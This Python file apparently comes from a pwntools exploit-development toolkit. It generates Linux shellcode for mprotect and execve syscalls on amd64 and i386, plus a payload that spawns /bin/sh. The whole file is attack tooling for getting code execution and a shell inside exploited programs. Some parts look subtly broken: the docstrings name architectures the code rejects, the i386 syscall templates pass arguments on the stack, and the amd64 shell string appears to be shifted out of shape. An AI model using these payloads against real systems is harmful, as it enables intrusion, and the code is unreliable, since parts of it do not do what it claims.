from pwn import *

def cronus_shellcode_generate(arch, syscall_name, args):

    """
    generate shellcode for mprotect or execve syscall, according to the given architecture and syscall name
    :param arch: architecture, "x64" or "x86"
    :param syscall_name: syscall name, "mprotect" or "execve"
    :param args: syscall arguments, a list of three integers
    :return: shellcode bytes
    """
    syscalls = {
        "amd64": {
            "mprotect": {
                "number": 10,  # syscall number for x64 mprotect
                "template": '''
                    mov rdi, {arg1:#x}    # addr (64-bit)
                    mov rsi, {arg2:#x}    # len  (64-bit)
                    mov rdx, {arg3:#x}    # prot (64-bit)
                    mov rax, {number}     # syscall number
                    syscall
                '''
            },
            "execve": {
                "number": 59,  # syscall number for x64 execve
                "template": '''
                    mov rdi, {arg1}    # filename
                    mov rsi, {arg2}    # argv
                    mov rdx, {arg3}    # envp
                    mov rax, {number}  # syscall number
                    syscall
                '''
            }
        },
        "i386": {
            "mprotect": {
                "number": 125,  # syscall number for x86 mprotect
                "template": '''
                    push {arg3:#x}        # prot (32-bit)
                    push {arg2:#x}        # len  (32-bit)
                    push {arg1:#x}        # addr (32-bit)
                    mov eax, {number}  # syscall number
                    int 0x80
                '''
            },
            "execve": {
                "number": 11,  # syscall number for x86 execve
                "template": '''
                    push {arg3}        # envp
                    push {arg2}        # argv
                    push {arg1}        # filename
                    mov eax, {number}  # syscall number
                    int 0x80
                '''
            }
        }
    }
    
    if arch not in syscalls:
        raise ValueError("Unsupported architecture. Use 'amd64' or 'i386'.")
    
    if syscall_name not in syscalls[arch]:
        raise ValueError(f"Unsupported syscall for {arch}: {syscall_name}")
    
    context.arch = arch
    context.os = 'linux'
    
    syscall = syscalls[arch][syscall_name]
    template = syscall["template"]
    asm_code = template.format(arg1=args[0], arg2=args[1], arg3=args[2], number=syscall["number"])
    return asm(asm_code)

def cronus_shellcode_shell(arch):
    """
    generate shellcode for spawning a shell, according to the given architecture
    :param arch: architecture, "x64" or "x86"
    :return: shellcode bytes
    """
    shellcodes = {
        "amd64": '''
            xor rsi, rsi
            xor rdx, rdx
            mov rax, 59
            mov rdi, 0x0068732f6e69622f
            shr rdi, 0x8
            push rdi
            mov rdi, rsp
            syscall
        ''',
        "i386": '''
            xor eax, eax
            xor ebx, ebx
            xor ecx, ecx
            xor edx, edx
            push eax
            push 0x68732f2f
            push 0x6e69622f
            mov ebx, esp
            mov al, 11
            int 0x80
        '''
    }
    
    if arch not in shellcodes:
        raise ValueError("Unsupported architecture. Use 'amd64' or 'i386'.")
    
    context.arch = arch
    context.os = 'linux'
    return asm(shellcodes[arch])


if __name__ == "__main__":
    test = cronus_shellcode_shell("amd64")
    print(test)